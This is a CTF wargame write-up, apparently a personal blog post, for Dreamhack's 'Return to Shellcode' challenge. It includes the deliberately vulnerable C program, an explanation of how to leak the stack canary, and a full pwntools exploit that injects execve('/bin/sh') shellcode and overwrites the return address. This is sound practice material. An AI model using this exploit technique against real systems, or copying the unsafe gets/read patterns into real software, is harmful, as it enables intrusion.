---
layout: post
title: "[dreamhack] Return to Shellcode"
comments: true
category: wargame
---

## checksec
<img src="/assets/img/Return-to-Shellcode/checksec.png" width="400">

There isn't NX, so we can exec code on stack.<br />
Maybe we have to leak canary, and overwrite RA to stack, and exec it.

***

## C code
```cpp
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

<img src="/assets/img/Return-to-Shellcode/execute1.png" width="400">

Compare c code and image of executing binary,<br />
binary writes buf's address and distance of buf and $rbp.<br />
Cause of aslr, buf's address is change every time, but distance is fixed.<br />

<img src="/assets/img/Return-to-Shellcode/execute2.png" width="400">

After send input to binary, it will write our input like above image.<br />
If there is no null bytes between our input and canary,<br />
then binary will print our input and canary all.<br />
(Because '%s' is just know string's end by null byte.)<br />
We can leak canary.

And then, we can again send input to binary.<br />
At this time, we know canary, so it becomes really similar to exploitaion-000.

***

## Ex code
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

shellcode = asm(shellcraft.execve('/bin/sh'))

r = process('./r2s')

r.recvuntil(b'buf: ')
bufAddr = int(r.recvn(14), 16)

buf = b'A' * 0x59
r.sendafter(b'Input: ', buf)
r.recvuntil(buf)
canary = u64(b'\x00' + r.recvn(7))

payload = shellcode + b'A' * (0x58 - len(shellcode))
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(bufAddr)
r.sendlineafter(b'Input ', payload)

r.interactive()
```